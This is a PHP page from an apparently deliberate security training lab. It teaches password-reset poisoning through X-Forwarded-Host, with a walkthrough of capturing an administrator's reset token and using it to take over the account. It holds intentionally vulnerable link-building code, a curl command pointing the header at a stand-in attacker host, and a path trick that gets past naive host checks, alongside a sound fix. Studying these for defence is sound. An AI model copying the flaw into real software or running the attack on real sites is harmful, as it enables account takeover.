<?php
require_once __DIR__ . '/helpers.php';
require_once __DIR__ . '/visit.php';   // the victim, as a library

$L = 3;
ar_handle_reset($L);
$meta = ar_levels()[$L];

$result   = '';
$pipeline = [];
$link     = '';
$visit    = null;

$defaultHost = (string)($_SERVER['HTTP_HOST'] ?? 'localhost');
$hostField   = trim((string)($_POST['host'] ?? ''));
$target      = trim((string)($_POST['target'] ?? AR_ADMIN));

/* ── Step 1: send the reset ─────────────────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['send'])) {

    // Lab plumbing: an HTML form cannot set a request header, so the field is
    // copied into the header slot the application reads. From a shell this is
    //   curl -H 'X-Forwarded-Host: attacker.hackinlab.internal' ... /level3.php
    // and the code below never knows the difference.
    if ($hostField !== '') {
        $_SERVER['HTTP_X_FORWARDED_HOST'] = $hostField;
    }

    $user = ar_user_by_email($L, $target);
    if ($user === null) {
        $result .= ar_err('No account is registered for <code>' . lk_esc($target) . '</code>.');
    } else {
        // The token itself is fine: 128 bits from the system CSPRNG.
        $token = bin2hex(random_bytes(16));
        $link  = ar_reset_link_from_request($token);

        ar_token_insert($L, $token, $target, (int)$user['id'], 'reset', null, null, 900);
        ar_send_reset_mail($L, $target, $token, $link);

        $result .= ar_info('Message written to the mailbox of <code>' . lk_esc($target) . '</code>. '
            . 'You cannot read it. The link inside it points at <code>'
            . lk_esc((string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? $defaultHost)) . '</code>.');
    }
}

/* ── Step 2: the administrator opens the message ────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['victim'])) {
    $visit = ar_visit_open_reset_mail($L);
    $result .= $visit['sent']
        ? ar_info('The administrator opened the newest message and their mail client fetched the link. '
            . lk_esc($visit['note']))
        : ar_err(lk_esc($visit['note']));
}

/* ── Step 3: use whatever you captured ──────────────────────────────────── */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['redeem'])) {
    $token = trim((string)($_POST['token'] ?? ''));
    $new   = (string)($_POST['new_password'] ?? '');
    $row   = $token === '' ? null : ar_token_find($L, $token);

    if ($row === null) {
        $result .= ar_err('That token is not in the level 3 store.');
    } elseif ($row['used_at'] !== null) {
        $result .= ar_err('That token has already been redeemed.');
    } elseif ($new === '') {
        $result .= ar_err('Choose a password to set.');
    } else {
        // Correct redemption: the account comes from the token row.
        $owner = ar_user_by_id($L, (int)$row['user_id']);
        if ($owner === null) {
            $result .= ar_err('The token does not resolve to an account.');
        } else {
            ar_set_password($L, (int)$owner['id'], $new);
            ar_token_mark_used((int)$row['id']);

            $after = ar_user_by_id($L, (int)$owner['id']);
            $ok    = password_verify($new, (string)$after['password_hash']);

            if ($ok && strcasecmp((string)$owner['email'], AR_ADMIN) === 0) {
                ar_mark_win($L, 'redeemed a token captured from a poisoned reset link');
                $result .= ar_ok('The administrator account now holds the password you chose.');
            } elseif ($ok) {
                $result .= ar_info('Password updated for <code>' . lk_esc((string)$owner['email']) . '</code>.');
            } else {
                $result .= ar_err('The update did not take effect.');
            }
        }
    }
}

$flag      = ar_win($L) ? ar_flag($L) : '';
$collected = ar_collected(6);

/* ── Trace ───────────────────────────────────────────────────────────────── */
if ($link !== '') {
    $pipeline[] = [
        'label' => '$_SERVER["HTTP_X_FORWARDED_HOST"]',
        'value' => (string)($_SERVER['HTTP_X_FORWARDED_HOST'] ?? $defaultHost),
        'note'  => 'Taken from the request. No allowlist, no comparison against configuration.',
    ];
    $pipeline[] = [
        'label' => '"http://" . $host . "/reset.php?token=" . $token',
        'value' => $link,
        'note'  => 'String concatenation into a URL. The host component sits before the path, so whatever you put '
                 . 'there decides which server the victim contacts.',
    ];
    $pipeline[] = [
        'label' => 'mail row written',
        'value' => 'to=' . $target . ' (not readable from mailbox.php)',
        'note'  => 'The token is inside a mailbox you have no access to. Reading it is not the plan.',
    ];
}
if ($visit !== null) {
    $pipeline[] = [
        'label'   => 'the administrator clicks the link',
        'value'   => $visit['link'] !== '' ? $visit['link'] : '(no message to open)',
        'note'    => lk_esc($visit['note']),
        'verdict' => $visit['sent'] && $visit['status'] > 0 ? 'pass' : 'block',
    ];
}
if ($collected) {
    $top = $collected[0];
    $pipeline[] = [
        'label'   => 'collector.php request log (newest entry)',
        'value'   => 'host=' . (string)$top['host'] . ' uri=' . (string)$top['uri'],
        'note'    => $top['token']
            ? 'A token was extracted from the query string. It came from the administrator\'s mail client, not from you.'
            : 'The request arrived but carried nothing that looks like a token.',
        'verdict' => $top['token'] ? 'pass' : null,
    ];
}
if ($flag !== '') {
    $pipeline[] = [
        'label'   => 'password_verify($yourString, users.password_hash)',
        'value'   => 'true',
        'note'    => 'The administrator row really holds the password you set.',
        'verdict' => 'pass',
    ];
}

/* ── Form ────────────────────────────────────────────────────────────────── */
ob_start(); ?>
<?= ar_toolbar($L, ['Collector' => 'collector.php']) ?>

<div class="ar-step">
    <h4>1 &middot; Send a reset, choosing the host the link will name</h4>
    <form method="post" action="level3.php">
        <input type="hidden" name="send" value="1">
        <div class="form-group">
            <label class="form-label">Address to recover</label>
            <input type="text" name="target" class="form-control" autocomplete="off" value="<?= lk_esc($target) ?>">
        </div>
        <div class="form-group">
            <label class="form-label">X-Forwarded-Host sent with the request</label>
            <input type="text" name="host" class="form-control ar-mono" autocomplete="off" spellcheck="false"
                   value="<?= lk_esc($hostField !== '' ? $hostField : $defaultHost) ?>">
        </div>
        <button class="btn btn-primary" type="submit">Send reset instructions</button>
    </form>
</div>

<div class="ar-step">
    <h4>2 &middot; Wait for the click</h4>
    <p class="lk-hintline">The administrator reads mail on their own schedule. Pressing this stands in for that:
       the newest message in their mailbox is opened and the URL inside it is fetched for real, over HTTP, by a
       client that resolves whatever hostname the link contains.</p>
    <form method="post" action="level3.php">
        <input type="hidden" name="victim" value="1">
        <button class="btn btn-primary" type="submit">The administrator opens the message</button>
    </form>
</div>

<div class="ar-step">
    <h4>3 &middot; Use what you collected</h4>
    <form method="post" action="level3.php">
        <input type="hidden" name="redeem" value="1">
        <div class="form-group">
            <label class="form-label">Token</label>
            <input type="text" name="token" class="form-control ar-mono" autocomplete="off" spellcheck="false"
                   value="<?= lk_esc((string)($_POST['token'] ?? '')) ?>">
        </div>
        <div class="form-group">
            <label class="form-label">New password for the account the token belongs to</label>
            <input type="text" name="new_password" class="form-control" autocomplete="off" value="">
        </div>
        <button class="btn btn-primary" type="submit">Redeem</button>
    </form>
</div>

<?= ar_admin_state_card($L) ?>
<?php $form = (string)ob_get_clean();

$code = <<<'PHP'
// app/Mail/ResetLink.php
// Behind the load balancer the real client host arrives in X-Forwarded-Host,
// so prefer it and fall back to the Host header.
function reset_link(string $token): string
{
    $host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'];
    return 'http://' . $host . '/reset.php?token=' . $token;
}

// POST /forgot-password
$token = bin2hex(random_bytes(16));          // 128 bits, correct
store_token($token, $user, expires: time() + 900);
send_reset_mail($user->email, reset_link($token));

return 'If that address is registered, we have sent reset instructions to it.';
PHP;

$fixBad = <<<'PHP'
$host = $_SERVER['HTTP_X_FORWARDED_HOST'] ?? $_SERVER['HTTP_HOST'];
return 'http://' . $host . '/reset.php?token=' . $token;
PHP;

$fixGood = <<<'PHP'
// The origin of your own application is configuration, not request data.
// It is the same value whether the request came from a browser, a cron job,
// or a queue worker with no request at all.
return rtrim(config('app.url'), '/') . '/reset.php?token=' . $token;

// If the deployment genuinely serves several hostnames, validate against the
// list before anything is allowed to use the value:
//
//   $host = $_SERVER['HTTP_HOST'] ?? '';
//   if (!in_array($host, config('app.allowed_hosts'), true)) {
//       throw new BadRequestException('unrecognised host');
//   }
//
// Do this at the edge, for every request, not at each call site. The same
// value also reaches password reset links, absolute redirects, cache keys,
// signed URLs, and anything that renders a link into an email.
PHP;

lk_page([
    'lab'        => arlab(),
    'level'      => $L,
    'title'      => $meta['title'],
    'difficulty' => $meta['difficulty'],
    'extra_head' => ar_extra_head(),

    'code'       => $code,
    'vuln_lines' => [6, 7],
    'annotation' => 'The token is generated correctly and stored correctly. The <em>address it is delivered to</em>
        is correct too. What the attacker controls is the URL printed inside the message, because the origin of that
        URL is read from the request that triggered the mail rather than from configuration.',

    'theory' => '<p><code>Host</code> is a request header. So is <code>X-Forwarded-Host</code>, and unlike the
        first it is often accepted from anyone who can reach the origin server, because the code assumes a proxy
        put it there. Neither is authenticated. An application that builds absolute URLs from either one has
        delegated part of its outbound mail to whoever sent the last request.</p>
        <p>What makes this class interesting is the delay between the injection and the payoff. Nothing happens
        when the poisoned request is sent: the response is the same bland sentence, no error appears in any log
        that anyone reads, and the attacker gets no feedback. The exploit completes later, on a different machine,
        when the victim opens a message that looks entirely legitimate &mdash; correct sender, correct wording,
        correct account &mdash; and follows a link whose hostname nobody reads.</p>
        <p>The same input reaches more places than the mailer. Cache keys built from the host produce a poisoned
        cache entry served to everyone. Absolute redirects built from the host become open redirects. Signed URLs
        built from the host validate against the wrong origin. Fixing the mailer alone leaves the rest, which is
        why the fix belongs at the edge: reject any request whose host is not on the list, once, before anything
        downstream reads it.</p>',

    'fix' => [
        'bad'  => $fixBad,
        'good' => $fixGood,
        'note' => 'Note the second-order rule as well: a link that carries a bearer credential should be built from
            configuration <em>and</em> the credential should be short-lived and single use, so that a leak of the
            URL through a referrer header, a proxy log or a shared screenshot has a small window.',
    ],

    'scenario' => '<strong>Scenario:</strong> the application sits behind a load balancer and was taught to prefer
        <code>X-Forwarded-Host</code> when building links. The balancer does not strip the header from inbound
        requests.
        <br><strong>Goal:</strong> get the administrator\'s reset token onto a host you control, then use it. The
        names <code>attacker.hackinlab.internal</code> and <code>collector.hackinlab.internal</code> resolve to a
        server you own; every path on them is logged by <a href="collector.php">collector.php</a>.',

    'model' => [
        'title' => 'Where the host lands inside the URL',
        'html'  => '<p>The link is assembled as <code>"http://" + host + "/reset.php?token=" + token</code>. A URL
        parses as <code>scheme://[authority][path][?query]</code>, and the value you supply is dropped in as the
        authority &mdash; the part that decides which machine the client opens a connection to.</p>
        <table class="lk-kv">
            <tr><td><code>localhost</code></td><td>http://localhost/reset.php?token=&hellip; &mdash; the normal link</td></tr>
            <tr><td><code>attacker.hackinlab.internal</code></td><td>the client connects to your host and asks it
                for <code>/reset.php?token=&hellip;</code>. Your server logs the request line, token included.</td></tr>
            <tr><td><code>localhost/collector.php?x=</code></td><td>everything after the first <code>/</code> is
                path, not host, so the URL becomes
                <code>http://localhost/collector.php?x=/reset.php?token=&hellip;</code> &mdash; the same capture
                without needing a second hostname.</td></tr>
        </table>
        <p>Both work here. The first is what the attack looks like in the real world; the second is worth knowing
        because it also works when the host is validated by a naive prefix or substring check.</p>
        <p>The sequence has three separate actors: you send the request, the server writes the mail, the victim
        makes the outbound connection. You never see the token in between, and the trace below is the only place
        those three steps appear next to each other.</p>',
    ],

    'form'     => $form,
    'result'   => $result,
    'flag'     => $flag,
    'flag_msg' => 'You wrote the link the application put in someone else\'s mail.',
    'why'      => '<p>The reset token was generated with 128 bits of entropy from the system CSPRNG, stored with a
        fifteen minute expiry, and mailed to the correct address. None of that mattered, because the message told
        the recipient to hand the token to a server of your choosing, and the recipient did.</p>
        <p>Look at what the application logged for the poisoned request: a successful password reset request, with
        a generic response, from an unauthenticated caller. There is nothing anomalous to alert on unless somebody
        is specifically checking that inbound host headers match the allowlist &mdash; which is exactly why that
        check belongs at the edge.</p>
        <p>The redemption at the end was the correct code path: the account came from the token row, the token had
        not been used, and the trace shows <code>password_verify()</code> returning true afterwards. You did not
        break the reset endpoint. You broke the message that leads to it.</p>',

    'pipeline' => $pipeline,
    'probes'   => [
        'param'  => 'probe',
        'method' => 'GET',
        'action' => 'collector.php',
        'items'  => [
            ['q' => 'Does the collector record a request that carries no token?',
             'payload' => 'hello',
             'learn'   => 'Confirms the log works and shows you the shape of an entry before a real capture arrives. The token column stays empty.'],
            ['q' => 'What does the collector pull out of a query string that has a token in the middle of it?',
             'payload' => '/reset.php?token=EXAMPLE0123',
             'learn'   => 'The extraction is a regex over the whole query string, so a token smuggled behind a path still gets picked up. Useful to know before you choose a host value.'],
            ['q' => 'Does the log record which hostname the client resolved?',
             'payload' => 'check-host',
             'learn'   => 'The host column shows the <code>Host</code> header the visiting client sent, which is the name it looked up. After a real capture, that column confirms the link was built the way you intended.'],
        ],
    ],
    'hints' => ar_hints($L),
]);
